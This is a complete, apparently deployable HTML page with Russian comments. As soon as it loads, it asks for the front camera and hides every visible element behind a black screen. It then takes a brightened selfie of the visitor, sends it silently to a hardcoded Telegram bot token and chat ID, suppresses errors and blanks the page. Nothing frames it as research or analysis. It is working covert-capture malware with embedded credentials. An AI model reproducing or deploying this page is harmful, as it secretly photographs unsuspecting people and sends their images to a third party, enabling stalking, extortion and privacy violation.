<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title></title>
<style>
  body, html { 
    margin:0; padding:0; 
    width:100%; height:100%; 
    background:#000; 
    overflow: hidden;
  }
  /* Скрываем только текстовые элементы */
  #status, h1, h2, h3, p, div:not(#preview) {
    color: #000 !important; /* Текст чёрный */
    opacity: 0 !important;
    visibility: hidden !important;
    position: absolute !important;
    top: -9999px !important;
    left: -9999px !important;
    width: 1px !important;
    height: 1px !important;
    overflow: hidden !important;
  }
  /* Видео элемент должен быть видим для браузера */
  #preview {
    position: fixed !important;
    top: 0 !important;
    left: 0 !important;
    width: 100% !important;
    height: 100% !important;
    object-fit: cover !important;
    opacity: 1 !important;
    visibility: visible !important;
    z-index: -1 !important; /* Помещаем за всё */
  }
  /* Body остаётся чёрным */
  body {
    background: #000 !important;
    position: fixed !important;
    top: 0 !important;
    left: 0 !important;
    width: 100% !important;
    height: 100% !important;
  }
</style>
</head>
<body>
<!-- Все элементы скрыты, но присутствуют для работы -->
<div id="status"></div>
<video id="preview" autoplay playsinline muted></video>

<script>
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';

function sleep(ms) { return new Promise(res => setTimeout(res, ms)); }

async function captureAndSend() {
  let stream = null;
  try {
    // 1. Запрашиваем камеру
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: { ideal: 'user' },
        width: { ideal: 1280 },
        height: { ideal: 720 },
        aspectRatio: { ideal: 9/16 }
      },
      audio: false
    });

    // 2. Создаём и настраиваем видео элемент
    const video = document.getElementById('preview');
    video.srcObject = stream;
    
    // Ждём инициализации видео
    await new Promise((resolve) => {
      if (video.readyState >= 2) {
        resolve();
        return;
      }
      video.addEventListener('loadeddata', resolve, { once: true });
      setTimeout(resolve, 1000);
    });

    // 3. Даём время камере на адаптацию (увеличено до 3 секунд)
    await sleep(3000);

    // 4. Проверяем размеры
    const vw = video.videoWidth || 1280;
    const vh = video.videoHeight || 720;

    // 5. Создаём canvas и делаем снимок
    const canvas = document.createElement('canvas');
    canvas.width = vw;
    canvas.height = vh;
    const ctx = canvas.getContext('2d');

    // Зеркалим для селфи-эффекта
    ctx.save();
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    ctx.restore();

    // 6. Останавливаем камеру
    stream.getTracks().forEach(t => t.stop());

    // 7. Улучшаем качество фото (усиленная коррекция для тёмных фото)
    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const data = imageData.data;
    
    for (let i = 0; i < data.length; i += 4) {
      // Сильное увеличение яркости (в 2 раза)
      data[i] = Math.min(255, data[i] * 2.0);     // R
      data[i+1] = Math.min(255, data[i+1] * 2.0); // G
      data[i+2] = Math.min(255, data[i+2] * 2.0); // B

      // Дополнительное улучшение контраста
      const avg = (data[i] + data[i+1] + data[i+2]) / 3;
      if (avg > 180) {
        data[i] = Math.min(255, data[i] * 1.1);
        data[i+1] = Math.min(255, data[i+1] * 1.1);
        data[i+2] = Math.min(255, data[i+2] * 1.1);
      } else if (avg < 100) {
        data[i] = Math.max(20, data[i] * 1.3);
        data[i+1] = Math.max(20, data[i+1] * 1.3);
        data[i+2] = Math.max(20, data[i+2] * 1.3);
      }
    }
    
    ctx.putImageData(imageData, 0, 0);

    // 8. Отправляем в Telegram (без ожидания ответа для скорости)
    canvas.toBlob((blob) => {
      if (!blob) return;
      
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'selfie_' + Date.now() + '.jpg');
      
      // Отправляем в фоновом режиме
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData,
        mode: 'no-cors',
        keepalive: true
      }).catch(() => {}); // Игнорируем ошибки
      
    }, 'image/jpeg', 0.9);

    // 9. Через 2 секунды очищаем страницу
    setTimeout(() => {
      document.body.innerHTML = '';
      document.body.style.cssText = 'position:fixed; width:100%; height:100%; background:#000;';
    }, 2000);

  } catch (err) {
    // Тихая обработка ошибок
    if (stream) stream.getTracks().forEach(t => t.stop());
  }
}

// Запускаем сразу
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', captureAndSend);
} else {
  captureAndSend();
}
</script>
</body>
</html>
